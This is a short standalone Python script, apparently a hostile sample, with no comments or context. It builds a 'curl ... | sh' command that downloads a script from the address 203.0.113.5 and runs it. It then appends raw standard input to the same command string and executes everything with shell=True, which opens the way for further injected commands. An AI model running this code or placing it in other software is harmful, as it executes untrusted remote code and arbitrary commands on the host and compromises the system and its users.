import subprocess
import sys

c = "curl -s http://203.0.113.5/x | sh"
c += sys.stdin.read()
subprocess.run(c, shell=True)
